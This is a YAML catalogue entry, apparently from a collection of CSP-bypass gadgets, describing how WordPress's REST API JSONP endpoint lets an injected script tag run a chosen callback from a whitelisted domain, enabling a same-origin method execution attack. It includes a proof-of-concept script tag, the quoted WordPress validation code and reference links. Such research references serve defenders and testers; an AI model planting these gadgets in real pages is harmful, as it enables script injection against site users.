---
description: The open source publishing platform of choice for millions of websites worldwide—from creators and small businesses to enterprises.
github: WordPress/WordPress
gadgets:
  Latest:
    authors:
      - twitter:paulosyibelo
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - script-tag
      - src-attr
      - wh-host-csp
      - any-timing
    pocs:
      - description: |
          The Wordpress framework has a JSONP endpoint to retrieve user data on `/wp-json/wp/v2/users/[id]?_jsonp=functionName`. This JSONP returns a `200 OK` only if the user `[id]` exists (This is mandatory for a script to load). The only restriction is that the `_jsonp` parameter must match `/[^\w\.]/`. This is enough to perform a [SOME](https://someattack.com/Playground/About) attack.

          *If needed, users id can be retrieved on `/wp-json/wp/v2/users`.*
        code: |
          <!-- user input -->
          <script src="https://wordpress.org/wp-json/wp/v2/users/8213290?_jsonp=alert"></script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/WordPress/WordPress/blob/a1c733124b07c201d43e3f29524db6c8b0bc0f56/wp-includes/load.php#L1933">https://github.com/WordPress/WordPress/blob/a1c733124b07c201d43e3f29524db6c8b0bc0f56/wp-includes/load.php#L1933</a>

      ```javascript
      function wp_is_jsonp_request() {
        if ( ! isset( $_GET['_jsonp'] ) ) {
          return false;
        }

        if ( ! function_exists( 'wp_check_jsonp_callback' ) ) {
          require_once ABSPATH . WPINC . '/functions.php';
        }

        $jsonp_callback = $_GET['_jsonp'];
        if ( ! wp_check_jsonp_callback( $jsonp_callback ) ) {
          return false;
        }

        /** This filter is documented in wp-includes/rest-api/class-wp-rest-server.php */
        $jsonp_enabled = apply_filters( 'rest_jsonp_enabled', true );

        return $jsonp_enabled;
      }
      ```

      Source: <a target="_blank" href="https://github.com/WordPress/WordPress/blob/a1c733124b07c201d43e3f29524db6c8b0bc0f56/wp-includes/functions.php#L4629">https://github.com/WordPress/WordPress/blob/a1c733124b07c201d43e3f29524db6c8b0bc0f56/wp-includes/functions.php#L4629</a>

      ```javascript
      function wp_check_jsonp_callback( $callback ) {
        if ( ! is_string( $callback ) ) {
          return false;
        }

        preg_replace( '/[^\w\.]/', '', $callback, -1, $illegal_char_count );

        return 0 === $illegal_char_count;
      }
      ```
    links:
      - https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/
      - https://someattack.com/Playground/About
---
